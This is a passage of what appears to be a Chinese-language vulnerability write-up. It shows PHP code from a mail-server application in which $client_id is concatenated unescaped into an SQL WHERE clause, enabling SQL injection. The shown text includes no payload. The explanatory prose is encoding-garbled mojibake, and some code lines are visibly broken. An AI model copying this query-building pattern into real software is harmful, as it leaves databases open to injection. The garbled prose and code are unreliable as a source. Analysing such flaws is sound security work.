&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å…¶ä¸­ &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$password&lt;/code&gt; çš†ç‚ºæ”»æ“Šè€…å¯æ§åƒæ•¸ï¼Œé›–ç„¶æœ‰å€‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; å‡½æ•¸å°å¯†ç¢¼é€²è¡Œè™•ç†ï¼Œä½†æ˜¯èˆ‡å¼±é»è§¸ç™¼ä¸¦ç„¡ç›¸é—œã€‚å…¶ä¸­è¦æ³¨æ„æ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; çš„å€¼æœƒè¢«ä»£å…¥æˆå…¨åŸŸè®Šæ•¸ï¼Œä»£è¡¨ç•¶å‰ä½¿ç”¨çš„ Application IDï¼Œä¸¦ä¸”åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; ä½¿ç”¨ï¼Œå…¶ä¸­åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; å…§æœ‰ä»¥ä¸‹ä»£ç¢¼ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt; ä¸­æ‰€é–‹å•Ÿè³‡æ–™åº«çš„åç¨±ç”±ä½¿ç”¨è€…å¯æ§ï¼Œå¦‚çµ¦éŒ¯èª¤çš„å€¼å°‡å°è‡´ç¨‹å¼ç„¡æ³•ç¹¼çºŒåŸ·è¡Œä¸‹å»ï¼Œæ‰€ä»¥å¿…é ˆå°‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; å½é€ æˆæ­£ç¢ºçš„å…§å®¹ã€‚&lt;/p&gt;

&lt;p&gt;æ¥è‘—æ˜¯æœ€ä¸»è¦çš„å‡½æ•¸ &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;SELECT t_mail_server.* FROM t_mail_server &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_status&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;exec:mysql_query(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;) respond:&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_server_id  != \&amp;#39;999\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;!(t_mail_server.c_flag &amp;amp; &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_server_id = \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_manager = \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;t_mail_server.c_name LIKE \&amp;#39;%&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;%\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;%%&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;t_mail_server.c_user_id LIKE \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; ä¸­æœƒå°‡æ‰€å‚³é€²çš„åƒæ•¸é€²è¡Œ SQL èªå¥çš„æ‹¼è£ï¼Œè€Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; ç‚ºæœ€é—œéµçš„ä¸€å€‹å‡½æ•¸ã€‚&lt;br /&gt;
åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; ä¸­å¯ä»¥çœ‹åˆ°åƒæ•¸çš†ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; ä¾†é˜²ç¦¦ä½†å”¯ç¨ç¼ºå°‘ &lt;code class=&quot;highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;ï¼Œå¾åŸå§‹ç¢¼çš„ Coding Style è§€å¯ŸçŒœæ¸¬æ‡‰è©²æ˜¯é–‹ç™¼æ™‚çš„ç–å¿½ï¼Œå› æ­¤æ ¹æ“šç¨‹å¼æµç¨‹é€å‡ºå°æ‡‰çš„åƒæ•¸å³å¯è§¸ç™¼ SQL Injectionã€‚&lt;/p&gt;

